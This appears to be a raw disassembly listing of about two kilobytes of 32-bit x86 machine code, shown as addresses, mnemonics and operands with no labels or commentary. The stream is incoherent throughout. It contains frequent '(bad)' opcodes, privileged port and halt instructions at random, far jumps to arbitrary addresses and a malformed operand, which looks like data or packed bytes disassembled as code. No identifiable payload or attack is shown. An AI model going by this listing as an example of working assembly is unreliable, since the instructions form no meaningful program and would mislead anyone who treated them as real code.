  41f4d2:	cmp    BYTE PTR [edx],ch
  41f4d4:	dec    eax
  41f4d5:	les    eax,FWORD PTR [edi-0x4a]
  41f4d8:	pop    ecx
  41f4d9:	push   eax
  41f4da:	fldcw  WORD PTR [esi+ecx*8]
  41f4dd:	icebp  
  41f4de:	fucom  st(4)
  41f4e0:	int3   
  41f4e1:	popf   
  41f4e2:	push   ebx
  41f4e3:	mov    WORD PTR [edi],cs
  41f4e5:	mov    dl,0x55
  41f4e7:	push   edi
  41f4e8:	in     eax,0xfc
  41f4ea:	dec    ebp
  41f4eb:	mov    BYTE PTR [ebp+0x4],al
  41f4ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4ef:	and    esi,ebp
  41f4f1:	fcom   QWORD PTR [edx+eax*2]
  41f4f4:	repnz dec ebx
  41f4f6:	inc    eax
  41f4f7:	mov    edi,0xd7c6e52b
  41f4fc:	cdq    
  41f4fd:	jmp    0xaab5:0xca34785
  41f504:	push   esi
  41f505:	and    eax,DWORD PTR [ecx-0x78643252]
  41f50b:	(bad)  
  41f50c:	xchg   BYTE PTR ds:0x4905ebb8,cl
  41f512:	pushf  
  41f513:	aas    
  41f514:	imul   edx,DWORD PTR [ebx+0x78],0xffffffaa
  41f518:	mov    eax,0x4545928b
  41f51d:	js     0x41f4ab
  41f51f:	sub    bp,sp
  41f522:	dec    BYTE PTR [edx-0x553d7eb2]
  41f528:	out    0x5d,eax
  41f52a:	les    edx,FWORD PTR [ebx-0x65]
  41f52d:	add    ah,dl
  41f52f:	loope  0x41f560
  41f531:	dec    esp
  41f532:	mov    BYTE PTR [eax],dl
  41f534:	sti    
  41f535:	rcl    BYTE PTR [ebx+0x39133d77],cl
  41f53b:	jl     0x89809a10
  41f541:	hlt    
  41f542:	(bad)  
  41f543:	fsub   DWORD PTR [eax+0xc5d76ea]
  41f549:	(bad)  
  41f54a:	adc    eax,0x23938840
  41f54f:	div    DWORD PTR [ebp-0x2f]
  41f552:	lds    edi,FWORD PTR [ecx+0x70]
  41f555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f556:	adc    DWORD PTR [esi-0x18cefca1],edx
  41f55c:	push   ebp
  41f55d:	pop    edx
  41f55e:	xchg   ebp,eax
  41f55f:	cwde   
  41f560:	fisubr WORD PTR [ecx-0x3e0bbac2]
  41f566:	pop    esi
  41f567:	retf   0xc90c
  41f56a:	lahf   
  41f56b:	test   eax,0xa4ed9a84
  41f570:	pop    esi
  41f571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f572:	popf   
  41f573:	push   esp
  41f574:	mov    esp,0x39f73b46
  41f579:	je     0x41f5da
  41f57b:	addr16 pushf 
  41f57d:	loop   0x41f5bd
  41f57f:	add    edx,0x1e
  41f582:	sub    BYTE PTR [ebx-0x73],ch
  41f585:	inc    ebx
  41f586:	xchg   esi,eax
  41f587:	push   es
  41f588:	gs push esp
  41f58a:	mov    eax,0xcd2047ee
  41f58f:	push   eax
  41f590:	inc    edi
  41f591:	hlt    
  41f592:	mov    eax,0x95b2a9b4
  41f597:	add    eax,0xc3d6a68f
  41f59c:	sub    BYTE PTR [esi+0x16],al
  41f59f:	lods   eax,DWORD PTR ds:[esi]
  41f5a0:	sub    DWORD PTR [ecx-0xf4da6c8],edx
  41f5a6:	ret    0x28a7
  41f5a9:	push   0x35
  41f5ab:	mov    bh,0x5f
  41f5ad:	cld    
  41f5ae:	xchg   esi,eax
  41f5af:	ret    
  41f5b0:	lods   eax,DWORD PTR ds:[esi]
  41f5b1:	mov    edx,0xd11d4e82
  41f5b6:	pop    ecx
  41f5b7:	adc    DWORD PTR [edx+ecx*8+0x51],0xffffffbd
  41f5bc:	mov    dh,0xdf
  41f5be:	adc    BYTE PTR [ebp-0x1e],dl
  41f5c1:	jge    0x41f579
  41f5c3:	inc    ebp
  41f5c4:	xchg   esp,eax
  41f5c5:	out    dx,eax
  41f5c6:	push   esi
  41f5c7:	add    al,0x6b
  41f5c9:	fiadd  WORD PTR [esi+0x2f5534c4]
  41f5cf:	in     al,dx
  41f5d0:	xor    cl,BYTE PTR [eax]
  41f5d2:	aam    0x78
  41f5d4:	les    ebp,FWORD PTR [edi+0x72ddf175]
  41f5da:	stos   DWORD PTR es:[edi],eax
  41f5db:	sub    edx,DWORD PTR [edi-0x3f5bdf37]
  41f5e1:	and    dh,ah
  41f5e3:	adc    BYTE PTR [ebp-0x7730ea53],bl
  41f5e9:	push   ebp
  41f5ea:	rcl    DWORD PTR [esi-0x2c8c3999],cl
  41f5f0:	mov    al,0xca
  41f5f2:	mov    ah,0xa1
  41f5f4:	stos   DWORD PTR es:[edi],eax
  41f5f5:	mov    edi,0x726ddf48
  41f5fa:	imul   ebx,DWORD PTR ds:[ecx-0x23],0xefb7291e
  41f602:	fiadd  DWORD PTR [esi+ecx*1-0x48b46cc7]
  41f609:	push   ecx
  41f60a:	out    0x13,al
  41f60c:	inc    edi
  41f60d:	xor    ebp,edx
  41f60f:	push   cs
  41f610:	rol    BYTE PTR [ecx+0xa],1
  41f613:	ss fcmovu st,st(7)
  41f616:	push   ebp
  41f617:	pop    eax
  41f618:	lock scas eax,DWORD PTR es:[edi]
  41f61a:	mov    BYTE PTR [edi+0x7e],cl
  41f61d:	mov    bl,0x2f
  41f61f:	call   0xfd5c313d
  41f624:	retf   0x965
  41f627:	es shl dl,1
  41f62a:	mov    ds:0x58d79c76,al
  41f62f:	ret    0x5096
  41f632:	sahf   
  41f633:	int3   
  41f634:	retw   
  41f636:	cmp    BYTE PTR [ecx+0x36],cl
  41f639:	mov    ecx,0xba2a40ae
  41f63e:	in     al,0x74
  41f640:	mov    ch,0x87
  41f642:	mov    cl,0xd9
  41f644:	jecxz  0x41f5e7
  41f646:	push   ds
  41f647:	retf   
  41f648:	add    BYTE PTR [ebx+0x42],0xfc
  41f64c:	loopne 0x41f640
  41f64e:	ins    DWORD PTR es:[edi],dx
  41f64f:	push   0x3e8e38b
  41f654:	aaa    
  41f655:	or     BYTE PTR [ebp-0x7c39f677],dh
  41f65b:	mov    DWORD PTR [edi-0x16],ecx
  41f65e:	test   al,bl
  41f660:	push   ss
  41f661:	outs   dx,DWORD PTR ds:[esi]
  41f662:	adc    BYTE PTR [eax+0x61],dl
  41f665:	fcomip st,st(1)
  41f667:	mov    BYTE PTR [edi],cl
  41f669:	cmp    DWORD PTR ds:0x3a2694fa,eax
  41f66f:	sbb    al,0x5f
  41f671:	push   0xffffffd6
  41f673:	sbb    eax,ebx
  41f675:	xchg   ebp,eax
  41f676:	mov    bl,0x9
  41f678:	mov    al,0x3e
  41f67a:	sti    
  41f67b:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41f67d:	hlt    
  41f67e:	mov    BYTE PTR [edx],bh
  41f680:	pop    ebx
  41f681:	dec    edi
  41f682:	jp     0x41f69e
  41f684:	pop    ebx
  41f685:	add    BYTE PTR [edi-0x5],bl
  41f688:	xchg   ebp,eax
  41f689:	push   eax
  41f68a:	or     dl,BYTE PTR fs:[ecx]
  41f68d:	lds    eax,FWORD PTR [edi-0x3f82c085]
  41f693:	into   
  41f694:	jg     0x41f670
  41f696:	data16 add al,0xc4
  41f699:	add    BYTE PTR [edx],dh
  41f69b:	push   edi
  41f69c:	mov    BYTE PTR ds:0x32ef84d9,al
  41f6a2:	(bad)  
  41f6a5:	push   eax
  41f6a6:	xor    al,0xa1
  41f6a8:	xchg   edi,eax
  41f6a9:	mov    ds:0x13d8294,eax
  41f6ae:	(bad)  
  41f6af:	repnz arpl si,bp
  41f6b2:	inc    eax
  41f6b3:	jge    0x41f720
  41f6b5:	in     eax,0x5b
  41f6b7:	out    dx,al
  41f6b8:	mov    edx,0xef5c9237
  41f6bd:	aam    0x37
  41f6bf:	push   0x9d42fcee
  41f6c4:	nop
  41f6c5:	pusha  
  41f6c6:	or     BYTE PTR [ecx+0xc],al
  41f6c9:	jmp    0xe193:0x1e19a7a8
  41f6d0:	adc    DWORD PTR [ebp+0x18],0xcd4507d4
  41f6d7:	int3   
  41f6d8:	cmp    ebp,esi
  41f6da:	je     0x41f707
  41f6dc:	ror    ebp,cl
  41f6de:	cld    
  41f6df:	aam    0x43
  41f6e1:	cmp    esi,DWORD PTR [eax]
  41f6e3:	xchg   edi,eax
  41f6e4:	or     BYTE PTR [eax],0xb0
  41f6e7:	inc    esp
  41f6e8:	or     BYTE PTR [bp+0x1163],al
  41f6ed:	shr    bl,0x0
  41f6f0:	cdq    
  41f6f1:	out    0xa7,al
  41f6f3:	scas   eax,DWORD PTR es:[edi]
  41f6f4:	or     eax,0xb22b2f2f
  41f6f9:	aaa    
  41f6fa:	or     eax,0x43c01a0a
  41f6ff:	adc    ch,BYTE PTR [edi-0x5]
  41f702:	dec    esp
  41f703:	adc    eax,0xc3de7abe
  41f708:	repz gs add esi,ecx
  41f70c:	scas   eax,DWORD PTR es:[edi]
  41f70d:	add    al,0x95
  41f70f:	adc    DWORD PTR [edx],ecx
  41f711:	and    ecx,edi
  41f713:	test   BYTE PTR [ebx],ah
  41f715:	imul   edi,DWORD PTR [ebp-0x76cf63d],0xbb2f3b64
  41f71f:	(bad)  
  41f721:	(bad)  
  41f722:	enter  0x863f,0x26
  41f726:	and    ecx,DWORD PTR [edi-0x3c47e010]
  41f72c:	xlat   BYTE PTR ds:[ebx]
  41f72d:	(bad)  
  41f72e:	fst    QWORD PTR [edx-0x5b9f2793]
  41f734:	push   edx
  41f735:	test   al,0x63
  41f737:	xchg   ecx,eax
  41f738:	jle    0x41f790
  41f73a:	or     bh,BYTE PTR [esi+0x6f]
  41f73d:	xchg   edi,eax
  41f73e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f73f:	cmp    eax,ecx
  41f741:	stos   BYTE PTR es:[edi],al
  41f742:	sub    eax,0xdc8aa6d3
  41f747:	ficomp WORD PTR [edi-0x54d7f658]
  41f74d:	sub    al,0xd2
  41f74f:	jp     0x41f707
  41f751:	leave  
  41f752:	xor    DWORD PTR [ebx+0x26],esp
  41f755:	gs jno 0x41f743
  41f758:	jmp    0x41f796
  41f75a:	pop    eax
  41f75b:	enter  0x8ec3,0x53
  41f75f:	test   bl,dl
  41f761:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f763:	out    dx,al
  41f764:	or     edi,esi
  41f766:	lods   al,BYTE PTR ds:[esi]
  41f767:	shl    BYTE PTR [ecx],0x3
  41f76a:	lds    esp,FWORD PTR [ebx]
  41f76c:	jnp    0x41f7ea
  41f76e:	loope  0x41f716
  41f770:	and    bl,BYTE PTR [ebx+0x660ce02c]
  41f776:	clc    
  41f777:	jge    0x41f75d
  41f779:	xchg   edi,eax
  41f77a:	ret    0xc1f4
  41f77d:	inc    esp
  41f77e:	stos   BYTE PTR es:[edi],al
  41f77f:	shl    BYTE PTR [ecx],cl
  41f781:	pop    ebp
  41f782:	iret   
  41f783:	mov    ebp,0xcea06e11
  41f788:	xor    eax,DWORD PTR [edi]
  41f78a:	sub    BYTE PTR [ebx-0x68],ch
  41f78d:	(bad)  
  41f78e:	ins    DWORD PTR es:[edi],dx
  41f78f:	imul   esp,DWORD PTR [edi+0x33e173c6],0x46f6641e
  41f799:	dec    ebp
  41f79a:	push   0x0
  41f79c:	ror    BYTE PTR [eax+0x5a],cl
  41f79f:	(bad)  
  41f7a0:	icebp  
  41f7a1:	mov    ecx,0x309ab991
  41f7a6:	or     ebp,esi
  41f7a8:	mov    ebp,0x72d95d07
  41f7ad:	add    DWORD PTR [edi+0x3],0x15aa2d3e
  41f7b4:	dec    edi
  41f7b5:	cdq    
  41f7b6:	test   BYTE PTR [eax+ecx*4-0x36943ea2],al
  41f7bd:	or     al,0x0
  41f7bf:	push   0xffffff96
  41f7c1:	je     0x41f787
  41f7c3:	ins    DWORD PTR es:[edi],dx
  41f7c4:	aaa    
  41f7c5:	ins    BYTE PTR es:[edi],dx
  41f7c6:	sbb    DWORD PTR [eax-0x2a],edx
  41f7c9:	int3   
  41f7ca:	sub    edi,DWORD PTR [esi-0xf1fcafe]
  41f7d0:	cmp    eax,0xc71f849a
  41f7d5:	xor    eax,0x65efbe60
  41f7da:	lahf   
  41f7db:	fild   QWORD PTR [edi-0x31]
  41f7de:	loop   0x41f762
  41f7e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7e1:	pop    ebp
  41f7e2:	jae    0x41f77e
  41f7e4:	fmul   QWORD PTR ds:0x8c91b955
  41f7ea:	inc    eax
  41f7eb:	fmul   st(5),st
  41f7ed:	loopne 0x41f835
  41f7ef:	clc    
  41f7f0:	test   dl,al
  41f7f2:	adc    eax,0x79329c45
  41f7f7:	inc    edi
  41f7f8:	adc    al,0xf4
  41f7fa:	ins    DWORD PTR es:[edi],dx
  41f7fb:	pop    edi
  41f7fc:	mov    ds:0x6670ab05,eax
  41f801:	cmp    ecx,ebp
  41f803:	dec    esi
  41f804:	lods   eax,DWORD PTR ds:[esi]
  41f805:	mov    esp,0x5c22a79f
  41f80a:	fucom  st(2)
  41f80c:	je     0x41f840
  41f80e:	imul   ebx,eax,0x9ea0b2b0
  41f814:	mov    eax,0xd629cd1a
  41f819:	cmp    al,0x50
  41f81b:	test   BYTE PTR [edx-0x32],ah
  41f81e:	add    DWORD PTR [esi+0x25],ebx
  41f821:	inc    eax
  41f822:	enter  0x9125,0x7
  41f826:	lds    edi,FWORD PTR [ecx-0x5]
  41f829:	sub    BYTE PTR [edx-0x3c],bh
  41f82c:	mov    ch,0x73
  41f82e:	clc    
  41f82f:	(bad)  
  41f831:	lea    ecx,[edx+esi*1]
  41f834:	test   cx,cx
  41f837:	retf   0x6844
  41f83a:	imul   ebx,edx,0x7ccf03e4
  41f840:	xchg   edx,eax
  41f841:	scas   al,BYTE PTR es:[edi]
  41f842:	lods   al,BYTE PTR ds:[esi]
  41f843:	and    eax,0xdc1b7c3c
  41f848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f849:	jnp    0x41f811
  41f84b:	pop    edi
  41f84c:	les    edi,FWORD PTR [ebp-0x2a]
  41f84f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f850:	idiv   BYTE PTR [edi-0x5fa538b2]
  41f856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f857:	fstp   TBYTE PTR [esi-0x4]
  41f85a:	push   0xa843cc37
  41f85f:	mov    edx,DWORD PTR [edx]
  41f861:	ss jecxz 0x41f7e8
  41f864:	retf   0x481b
  41f867:	mov    bh,BYTE PTR ds:0xb0b51c62
  41f86d:	pop    ss
  41f86e:	lock and al,0xa3
  41f871:	ss repnz aaa 
  41f874:	out    dx,eax
  41f875:	adc    BYTE PTR [edi+0x12],bl
  41f878:	sub    eax,0xca8dc60f
  41f87d:	or     DWORD PTR [ebp+edi*1-0x3b2240b0],ebx
  41f884:	imul   ecx,esp,0xffffffa8
  41f887:	scas   al,BYTE PTR es:[edi]
  41f888:	push   0xe2b32571
  41f88d:	dec    ebp
  41f88e:	mov    esp,0xff0b7ba2
  41f893:	nop
  41f894:	mov    dh,ah
  41f896:	fldcw  WORD PTR [esi]
  41f898:	out    dx,al
  41f899:	push   edx
  41f89a:	pop    esi
  41f89b:	pop    ebp
  41f89c:	xor    dl,ch
  41f89e:	mov    bh,0x8b
  41f8a0:	mov    edi,0xce715531
  41f8a5:	mov    dl,0x44
  41f8a7:	cdq    
  41f8a8:	ret    0x3732
  41f8ab:	pop    edx
  41f8ac:	inc    ecx
  41f8ad:	pop    ss
  41f8ae:	fld    DWORD PTR [ecx+ebx*4-0x16b654ea]
  41f8b5:	aad    0xa6
  41f8b7:	add    BYTE PTR [edx],bh
  41f8b9:	sbb    bl,BYTE PTR [edi+0x65]
  41f8bc:	xor    al,0xcf
  41f8be:	fcom   QWORD PTR [esi-0x7f]
  41f8c1:	xor    al,0x55
  41f8c3:	cmp    al,0x96
  41f8c5:	pusha  
  41f8c6:	or     eax,DWORD PTR [esi-0x31]
  41f8c9:	inc    edi
  41f8ca:	adc    al,0x5c
  41f8cc:	fs dec ecx
  41f8ce:	mov    ebx,0xf02854fc
  41f8d3:	mov    edx,?
  41f8d5:	sbb    ch,bh
  41f8d7:	dec    esi
  41f8d8:	xor    eax,0x7288461a
  41f8dd:	push   edx
  41f8de:	xor    ch,BYTE PTR [edi-0x7f]
  41f8e1:	adc    eax,DWORD PTR [ebx-0x395276c4]
  41f8e7:	pusha  
  41f8e8:	out    0x9e,eax
  41f8ea:	aad    0x65
  41f8ec:	out    dx,al
  41f8ed:	shl    DWORD PTR [ebp-0x52],cl
  41f8f0:	mov    ebx,DWORD PTR [edi-0x5e]
  41f8f3:	jo     0x41f8e5
  41f8f5:	xor    ebp,eax
  41f8f7:	in     eax,0xeb
  41f8f9:	mov    ebp,0xfc90c8a4
  41f8fe:	lods   eax,DWORD PTR ds:[esi]
  41f8ff:	push   esp
  41f900:	jecxz  0x41f88f
  41f902:	mov    esi,0x6077d00c
  41f907:	mov    eax,0x5f739a70
  41f90c:	out    0x5f,eax
  41f90e:	bnd ja 0x41f8cb
  41f911:	and    al,0x45
  41f913:	add    BYTE PTR [edi],0xec
  41f916:	jae    0x41f973
  41f918:	mov    al,0x3
  41f91a:	aas    
  41f91b:	pop    es
  41f91c:	or     bl,BYTE PTR ds:0x64100822
  41f922:	xchg   esp,eax
  41f923:	fbstp  TBYTE PTR [esi+0x11]
  41f926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f927:	mov    esp,0xc1d127bd
  41f92c:	add    eax,0x804119e4
  41f931:	neg    BYTE PTR [ebx-0x2d]
  41f934:	stos   DWORD PTR es:[edi],eax
  41f935:	imul   esi,DWORD PTR [ecx+0x7ec2e805],0x3508e119
  41f93f:	mov    dh,0x1f
  41f941:	dec    ebp
  41f942:	mov    dh,0xef
  41f944:	aaa    
  41f945:	jbe    0x41f918
  41f947:	sbb    DWORD PTR [eax+0x733980fb],ebx
  41f94d:	mov    edx,0xc922657b
  41f952:	push   es
  41f953:	jne    0x41f90b
  41f955:	(bad)  
  41f956:	cmp    eax,0x31e254ae
  41f95b:	or     BYTE PTR [ecx+ebx*8-0x4508367f],al
  41f962:	out    0xb,al
  41f964:	sub    esi,DWORD PTR [esi+0x1d]
  41f967:	xchg   ecx,eax
  41f968:	shr    BYTE PTR [ebp+0x6310eaca],1
  41f96e:	dec    esi
  41f96f:	loope  0x41f9d3
  41f971:	xchg   ebp,eax
  41f972:	out    dx,al
  41f973:	shl    BYTE PTR [ebx-0x3d],0xa7
  41f977:	cmp    ah,BYTE PTR [edx]
  41f979:	push   eax
  41f97a:	mov    dh,0xf4
  41f97c:	mov    cl,0x88
  41f97e:	jmp    0xa0d9df83
  41f983:	xor    dh,dh
  41f985:	out    dx,al
  41f986:	aas    
  41f987:	in     eax,dx
  41f988:	test   eax,edx
  41f98a:	jge    0x41f9a3
  41f98c:	sub    ebp,DWORD PTR [edx]
  41f98e:	dec    edi
  41f98f:	sbb    BYTE PTR [esi],0x2c
  41f992:	mov    ecx,0xd48c5b9d
  41f997:	cmp    eax,0xc46c2769
  41f99c:	xor    ebx,DWORD PTR [ebp-0x33]
  41f99f:	test   edi,ebx
  41f9a1:	(bad)
  41f9a4:	dec    ebp
  41f9a5:	ja     0x41fa23
  41f9a7:	mov    edx,0xaaf2bc51
  41f9ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9ad:	(bad)  
  41f9ae:	stc    
  41f9af:	jmp    0x3b3a696a
  41f9b4:	retf   
  41f9b5:	aas    
  41f9b6:	jns    0x41f9a4
  41f9b8:	sbb    eax,0xfb952274
  41f9bd:	sub    eax,0xb08bdb63
  41f9c2:	pusha  
  41f9c3:	aad    0x46
  41f9c5:	xor    al,0xa5
  41f9c7:	mov    DWORD PTR [esi],ecx
  41f9c9:	rcl    edx,0x50
  41f9cc:	sub    edx,DWORD PTR [edi-0x3138853a]
  41f9d2:	or     DWORD PTR [ebx],edx
  41f9d4:	inc    esp
  41f9d5:	xchg   ebp,eax
  41f9d6:	mov    ebp,DWORD PTR [ecx-0x24]
  41f9d9:	outs   dx,BYTE PTR ds:[esi]
  41f9da:	and    al,0x32
  41f9dc:	mov    ds:0xa992e968,eax
  41f9e1:	mov    ebx,0xd921fc44
  41f9e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f9e7:	push   ecx
  41f9e8:	push   ebx
  41f9e9:	push   ebp
  41f9ea:	xchg   esi,eax
  41f9eb:	or     BYTE PTR [eax-0x7f],0xc
  41f9ef:	jmp    0x41f9b6
  41f9f1:	out    dx,al
  41f9f2:	ss add al,0xb9
  41f9f5:	mov    eax,fs
  41f9f7:	push   0xde4a2c1e
  41f9fc:	and    al,0x6c
  41f9fe:	daa    
  41f9ff:	outs   dx,DWORD PTR ds:[esi]
  41fa00:	and    DWORD PTR [esi-0x70],edx
  41fa03:	or     eax,0xd00130b
  41fa08:	sub    bh,bl
  41fa0a:	int    0x79
  41fa0c:	scas   al,BYTE PTR es:[edi]
  41fa0d:	bound  edi,QWORD PTR cs:[eax+0xa1a9e9b]
  41fa14:	pushf  
  41fa15:	aam    0x1
  41fa17:	aaa    
  41fa18:	push   es
  41fa19:	gs ja  0x41fa9b
  41fa1c:	xor    edx,DWORD PTR [edx-0x860637f]
  41fa22:	inc    edx
  41fa23:	(bad)  
  41fa24:	test   eax,0xa1f8b1f1
  41fa29:	out    0xdd,al
  41fa2b:	lods   eax,DWORD PTR ds:[esi]
  41fa2c:	mov    ds:0xff3358f1,eax
  41fa31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa32:	jns    0x41fa58
  41fa34:	test   eax,0x303abcd
  41fa39:	shr    BYTE PTR [edx+0x5d],0x6
  41fa3d:	xor    ecx,ecx
  41fa3f:	out    0xe3,eax
  41fa41:	into   
  41fa42:	ja     0x41fa2c
  41fa44:	pop    eax
  41fa45:	pop    eax
  41fa46:	div    DWORD PTR [eax-0x6]
  41fa49:	sub    DWORD PTR [edi+0x66a85ee],eax
  41fa4f:	mov    ecx,0xdc5af50f
  41fa54:	test   ebx,ebx
  41fa56:	xchg   bl,bh
  41fa58:	cmp    bh,cl
  41fa5a:	inc    ebp
  41fa5b:	mov    bh,0x4e
  41fa5d:	pop    ds
  41fa5e:	ror    BYTE PTR [ecx],0xb7
  41fa61:	in     al,0x67
  41fa63:	dec    esi
  41fa64:	pop    esp
  41fa65:	dec    BYTE PTR [edi+0x35]
  41fa68:	fist   WORD PTR [edi+0x43]
  41fa6b:	vpavgw ymm1,ymm3,YMMWORD PTR [eax+0x73]
  41fa70:	or     BYTE PTR [edi],0x11
  41fa73:	mov    al,0x60
  41fa75:	cmp    al,bh
  41fa77:	loope  0x41fa70
  41fa79:	mov    cl,0x76
  41fa7b:	pop    ebx
  41fa7c:	sbb    bl,ah
  41fa7e:	adc    eax,0x85db449e
  41fa83:	loop   0x41faef
  41fa85:	mov    ch,0xf1
  41fa87:	jae    0x41fade
  41fa89:	push   esp
  41fa8a:	cmp    eax,0x8f8dfa9e
  41fa8f:	aad    0xd5
  41fa91:	inc    eax
  41fa92:	push   edx
  41fa93:	mov    al,ds:0x817ed896
  41fa98:	cmp    ebp,DWORD PTR ds:0x989060c2
  41fa9e:	out    dx,al
  41fa9f:	jne    0x41fafb
  41faa1:	lock adc DWORD PTR [eax+0x47],0xc1dd2c43
  41faa9:	pop    es
  41faaa:	add    BYTE PTR [ecx+0x250c0b0c],dl
  41fab0:	hlt    
  41fab1:	jl     0x41fb0f
  41fab3:	inc    ebx
  41fab4:	lahf   
  41fab5:	pop    eax
  41fab6:	call   0xacf0:0x5fbda4e7
  41fabd:	adc    al,0xe1
  41fabf:	mov    DWORD PTR [edx],ebp
  41fac1:	ret    
  41fac2:	lea    edi,ds:0x385a6ab9
  41fac8:	add    eax,0x591fa28f
  41facd:	leave  
  41face:	inc    ecx
  41facf:	inc    eax
  41fad0:	retf   
  41fad1:	sbb    DWORD PTR [ebx],ebp
  41fad3:	nop
  41fad4:	sti    
  41fad5:	jmp    DWORD PTR [ebx-0x4e59fa8e]
  41fadb:	jecxz  0x41fad6
  41fadd:	int    0xc
  41fadf:	mov    al,0x15
  41fae1:	mov    gs,WORD PTR [ebx-0x64f3c04d]
  41fae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fae8:	lods   eax,DWORD PTR ds:[esi]
  41fae9:	pop    ds
  41faea:	push   0x5ffa396b
  41faef:	jo     0x41face
  41faf1:	into   
  41faf2:	out    dx,eax
  41faf3:	sub    cl,cl
  41faf5:	mov    dl,0x8
  41faf7:	dec    edi
  41faf8:	aaa    
  41faf9:	fnstsw WORD PTR [edx]
  41fafb:	sbb    al,0x20
  41fafd:	addr16 ja 0x41fa9a
  41fb00:	out    0x8d,al
  41fb02:	dec    ecx
  41fb03:	ds push esi
  41fb05:	das    
  41fb06:	stc    
  41fb07:	gs gs aad 0xf
  41fb0b:	pop    edx
  41fb0c:	xor    ah,BYTE PTR [esi-0x45]
  41fb0f:	sbb    BYTE PTR [edx-0x67],0xc8
  41fb13:	das    
  41fb14:	sub    cl,BYTE PTR [ecx-0x6cdde639]
  41fb1a:	jl     0x41fb52
  41fb1c:	popf   
  41fb1d:	call   0xb4483c6d
  41fb22:	pusha  
  41fb23:	xchg   esp,eax
  41fb24:	inc    ecx
  41fb25:	mov    ds:0x1248adf5,al
  41fb2a:	pop    ebx
  41fb2b:	imul   eax,DWORD PTR [eax-0x39],0xffffffbb
  41fb2f:	dec    edi
  41fb30:	xchg   ebx,eax
  41fb31:	xchg   edx,eax
  41fb32:	call   0x353e:0x566f7b41
  41fb39:	cmp    edx,esp
  41fb3b:	mov    esp,0xb2a094f4
  41fb40:	fidiv  WORD PTR [edx]
  41fb42:	out    dx,al
  41fb43:	mov    DWORD PTR [ecx],0x41c12d2d
  41fb49:	xchg   esp,eax
  41fb4a:	scas   eax,DWORD PTR es:[edi]
  41fb4b:	push   0xb2010b8e
  41fb50:	push   0x25
  41fb52:	repz ja 0x41fb9c
  41fb55:	jmp    0x5938:0xfeabb030
  41fb5c:	xchg   ebx,eax
  41fb5d:	stos   DWORD PTR es:[edi],eax
  41fb5e:	add    esi,DWORD PTR [esi-0x5c4a3031]
  41fb64:	stos   DWORD PTR es:[edi],eax
  41fb65:	aam    0x91
  41fb67:	cmc    
  41fb68:	inc    ebp
  41fb69:	xor    al,0x64
  41fb6b:	pop    esi
  41fb6c:	ins    DWORD PTR es:[edi],dx
  41fb6d:	or     al,0x57
  41fb6f:	jne    0x41fbb7
  41fb71:	shl    esi,cl
  41fb73:	sub    ebx,DWORD PTR [esi+0x170da0cc]
  41fb79:	xor    DWORD PTR [eax],edx
  41fb7b:	iret   
  41fb7c:	jbe    0x41fbed
  41fb7e:	push   ebx
  41fb7f:	iret   
  41fb80:	mov    bh,0x28
  41fb82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb83:	test   BYTE PTR [ebp-0xf],dl
  41fb86:	scas   eax,DWORD PTR es:[edi]
  41fb87:	push   edi
  41fb88:	jp     0x41fbdb
  41fb8a:	xlat   BYTE PTR ds:[ebx]
  41fb8b:	shl    BYTE PTR [eax],1
  41fb8d:	or     cl,al
  41fb8f:	fst    st(4)
  41fb91:	js     0x41fb5d
  41fb93:	out    0x38,eax
  41fb95:	adc    edi,DWORD PTR [ecx-0x23aeb83f]
  41fb9b:	inc    esp
  41fb9c:	push   ss
  41fb9d:	push   0xffffff93
  41fb9f:	das    
  41fba0:	imul   ecx,DWORD PTR [ebx-0x2a],0xffffff8c
  41fba4:	xchg   esp,eax
  41fba5:	pop    es
  41fba6:	pop    ds
  41fba7:	push   eax
  41fba8:	fs mov eax,0x1e74d700
  41fbae:	aaa    
  41fbaf:	test   al,0xfc
  41fbb1:	ror    DWORD PTR [edx-0x71],0xf4
  41fbb5:	mov    ebx,0x89ef58bb
  41fbba:	dec    ebx
  41fbbb:	in     al,0x7
  41fbbd:	lods   al,BYTE PTR ds:[esi]
  41fbbe:	imul   eax,DWORD PTR [ecx+0x54],0x39182e3a
  41fbc5:	mov    dh,0x74
  41fbc7:	adc    eax,0xd3369f0a
  41fbcc:	cli    
  41fbcd:	dec    ecx
  41fbce:	dec    eax
  41fbcf:	pop    esp
  41fbd0:	push   cs
  41fbd1:	cwde   
  41fbd2:	xchg   ebp,eax
  41fbd3:	ret    0xe30c
  41fbd6:	(bad)  
  41fbd7:	(bad)  [ecx]
  41fbd9:	xchg   ebx,eax
  41fbda:	outs   dx,DWORD PTR ds:[esi]
  41fbdb:	je     0x41fc25
  41fbdd:	ret    
  41fbde:	stos   DWORD PTR es:[edi],eax
  41fbdf:	iret   
  41fbe0:	stos   BYTE PTR es:[edi],al
  41fbe1:	adc    al,ch
  41fbe3:	xchg   ecx,eax
  41fbe4:	mov    eax,0xb63a1bc3
  41fbe9:	cmp    eax,0x3876f27
  41fbee:	jg     0x41fbd5
  41fbf0:	mov    edx,0x86796102
  41fbf5:	mov    al,0x4d
  41fbf7:	into   
  41fbf8:	cmp    BYTE PTR [edx],ch
  41fbfa:	rol    dl,0x7b
  41fbfd:	adc    ecx,DWORD PTR [eax-0x50c5a28e]
  41fc03:	div    bl
  41fc05:	cs push esp
  41fc07:	into   
  41fc08:	icebp  
  41fc09:	inc    edx
  41fc0a:	hlt    
  41fc0b:	sub    eax,0x8fe6a141
  41fc10:	test   eax,0xad6c1528
  41fc15:	jmp    0x4aae88bc
  41fc1a:	lock lock xchg BYTE PTR [edi+0x32],cl
  41fc1f:	mov    ch,0x88
  41fc21:	bound  ebp,QWORD PTR [edx]
